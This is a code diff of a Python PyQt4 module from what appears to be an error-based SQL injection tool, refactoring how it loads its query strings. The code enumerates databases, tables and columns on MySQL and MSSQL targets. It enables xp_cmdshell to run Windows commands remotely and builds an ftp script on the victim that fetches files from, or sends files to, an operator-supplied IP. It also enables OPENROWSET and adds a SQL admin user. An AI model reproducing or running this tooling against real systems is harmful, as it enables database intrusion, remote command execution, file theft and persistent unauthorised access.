@@ -20,7 +20,7 @@ import txtproc
 from PyQt4 import QtCore
 from threading import *
 from queue import Queue
-from querystrings import error_based
+#from querystrings import error_based
 
 
 class ErrorBased(QtCore.QThread):
@@ -38,9 +38,10 @@ class ErrorBased(QtCore.QThread):
     positionSignal = QtCore.pyqtSignal(str)
     #-------------------------------------#
     
-    def __init__(self, args):
+    def __init__(self, args, qstrs):
         QtCore.QThread.__init__(self)
         self.vars = args
+        self.qstrings = qstrs
         
     def run(self):
 
@@ -91,9 +92,9 @@ class ErrorBased(QtCore.QThread):
 #Current db type selected
     def dbType(self, key):
         if self.vars['db_type'] == "mysql":
-            return error_based.mysql[key]
+            return self.qstrings['mysql_error_based'][key]
         else:
-            return error_based.mssql[key]
+            return self.qstrings['mssql_error_based'][key]
         
 #Get current database
     def getCurrDb(self):
@@ -114,7 +115,7 @@ class ErrorBased(QtCore.QThread):
         if self.vars['notInArray']:
             current_db = self.vars['dbName']
             while True:
-                query = self.buildQuery(error_based.mssql['get_db_name'], {'cdb' : current_db})
+                query = self.buildQuery(self.dbType('get_db_name'), {'cdb' : current_db})
                 db_name = web.webRequest(self.vars, query, False)
                 if db_name == "no_content":
                     web.debug(sys._getframe().f_code.co_name + "() -> db_name")
@@ -167,7 +168,7 @@ class ErrorBased(QtCore.QThread):
         if self.vars['notInArray']:
             current_table = ""
             while True:
-                query = self.buildQuery(error_based.mssql['get_tbl_name'], {'cdb' : current_db, 'ctbl' : current_table})
+                query = self.buildQuery(self.dbType('get_tbl_name'), {'cdb' : current_db, 'ctbl' : current_table})
                 table_name = web.webRequest(self.vars, query, False)
                 if table_name == "no_content":
                     web.debug(sys._getframe().f_code.co_name + "() -> table_name")
@@ -214,7 +215,7 @@ class ErrorBased(QtCore.QThread):
             for i in range (self.vars['tblTreeCount']):
                 current_table = txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                 current_column = ""
-                query = self.buildQuery(error_based.mssql['columns_count'], {'cdb' : current_db, 'ctbl' : current_table})
+                query = self.buildQuery(self.dbType('columns_count'), {'cdb' : current_db, 'ctbl' : current_table})
                 columnsInTable = web.webRequest(self.vars, query, False)
                 if columnsInTable == "no_content": 
                     web.debug(sys._getframe().f_code.co_name + "() -> notInArray -> columnsinTable")
@@ -280,7 +281,7 @@ class ErrorBased(QtCore.QThread):
             .replace("\\t", "\t").replace("\\n", "\n").replace("'/",  "'")
         else:
             result = "NULL"
-            web.webRequest(self.vars, self.vars['cmd'], True)
+            web.webRequest(self.vars, self.vars['query_cmd'], True)
         self.querySignal.emit(result)
 
  #Making synchronized threads for dumper
@@ -320,20 +321,20 @@ class ErrorBased(QtCore.QThread):
 #============================[MSSQL FUNCTIONS ONLY]============================#
 #Enable xp_cmdshell request
     def enableXpCmdShell(self):
-        web.webRequest(self.vars, error_based.mssql['enable_xp_cmdshell'], True)
+        web.webRequest(self.vars, self.qstrings['mssql_error_based']['enable_xp_cmdshell'], True)
         self.msgSignal.emit("Enable xp_cmdshell request sent.")
 
 #xp_cmdshell - windows command execution    
     def xpCmdShell(self):
         #Delete tmp_table if already exist
-        web.webRequest(self.vars, error_based.mssql['drop_tmp_tbl'], True)
+        web.webRequest(self.vars, self.qstrings['mssql_error_based']['drop_tmp_tbl'], True)
         #Creating tmp table
-        web.webRequest(self.vars, error_based.mssql['create_tmp_tbl'], True)
+        web.webRequest(self.vars, self.qstrings['mssql_error_based']['create_tmp_tbl'], True)
         #Inserting xp_cmdshell output to temp table
-        query = self.buildQuery(error_based.mssql['insert_result'], {'cmd' : txtproc.strToHex(self.vars['cmd'])})
+        query = self.buildQuery(self.qstrings['mssql_error_based']['insert_result'], {'cmd' : txtproc.strToHex(self.vars['cmd'])})
         web.webRequest(self.vars, query, True)
         #Getting count of rows in temp table
-        query = self.buildQuery(error_based.mssql['tmp_count'])
+        query = self.buildQuery(self.qstrings['mssql_error_based']['tmp_count'])
         rowCount = web.webRequest(self.vars, query, False)
         if rowCount == "no_content":
             return
@@ -353,7 +354,7 @@ class ErrorBased(QtCore.QThread):
                 tNum = tQueue.get_nowait()
             except Exception:  
                 break
-            query = self.buildQuery(error_based.mssql['get_row'], {'num' : str(tNum)})
+            query = self.buildQuery(self.qstrings['mssql_error_based']['get_row'], {'num' : str(tNum)})
             cmdResult = web.webRequest(self.vars, query, False)
             if cmdResult == "no_content":
                 web.debug(sys._getframe().f_code.co_name + "() -> cmdResult")
@@ -367,51 +368,45 @@ class ErrorBased(QtCore.QThread):
 #Upload file using built-in ftp.exe 
     def uploadFile(self):
         ftpFiles = self.vars['ftpFiles']
+        execCmd = self.qstrings['mssql_error_based']['exec_cmdshell']
         #del ..\temp\ftp.txt /Q
-        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
         web.webRequest(self.vars, query, True)
         #echo login> ..\temp\ftp.txt
-        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                {'hex' : txtproc.strToHex("echo " + self.vars['login'] + "> ..\\temp\\ftp.txt")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['login'] + "> ..\\temp\\ftp.txt")})
         web.webRequest(self.vars, query, True)
         #echo password>> ..\temp\ftp.txt
-        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                {'hex' : txtproc.strToHex("echo " + self.vars['password'] + ">> ..\\temp\\ftp.txt")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo " + self.vars['password'] + ">> ..\\temp\\ftp.txt")})
         web.webRequest(self.vars, query, True)
         for file in ftpFiles:
             #Use SEND or GET ftp command?
             if self.vars['ftp_mode'] == "get":
                 #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
-                query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                    {'hex' : txtproc.strToHex("echo get " + file + " "\
+                query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo get " + file + " "\
                                     + self.vars['ftpPath'] + file + ">> ..\\temp\\ftp.txt")})
             else:
                 #echo send c:\path\file.exe>> ..\temp\ftp.txt
-                query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                    {'hex' : txtproc.strToHex("echo send " + self.vars['ftpPath']  +  file + ">> ..\\temp\\ftp.txt")})
+                query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo send " + self.vars['ftpPath']\
+                                    +  file + ">> ..\\temp\\ftp.txt")})
             web.webRequest(self.vars, query, True)
         #echo bye>> ..\temp\ftp.txt
-        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                {'hex' : txtproc.strToHex("echo bye>> ..\\temp\\ftp.txt")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("echo bye>> ..\\temp\\ftp.txt")})
         web.webRequest(self.vars, query, True)
         #ftp -s:..\temp\ftp.txt IP
-        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                {'hex' : txtproc.strToHex("ftp -s:..\\temp\\ftp.txt " + self.vars['ip'])})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("ftp -s:..\\temp\\ftp.txt " + self.vars['ip'])})
         web.webRequest(self.vars, query, True)
         #del ..\temp\ftp.txt /Q
-        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
-                                {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
+        query = self.buildQuery(execCmd, {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
         web.webRequest(self.vars, query, True)
     
 #Enable OPENROWSET request
     def enableOpenrowset(self):
-        web.webRequest(self.vars, error_based.mssql['enable_openrowset'], True)
+        web.webRequest(self.vars, self.qstrings['mssql_error_based']['enable_openrowset'], True)
         self.msgSignal.emit("Enable OPENROWSET request sent.")
         
 #Add user request        
     def addSqlUser(self):
-        query =  self.buildQuery(error_based.mssql['add_sqladmin'], 
+        query =  self.buildQuery(self.qstrings['mssql_error_based']['add_sqluser'], 
                                  {'login' : self.vars['addUserLogin'], 'password' : self.vars['addUserPassword']})
         web.webRequest(self.vars, query, True)
         self.msgSignal.emit("Add admin user request sent.")
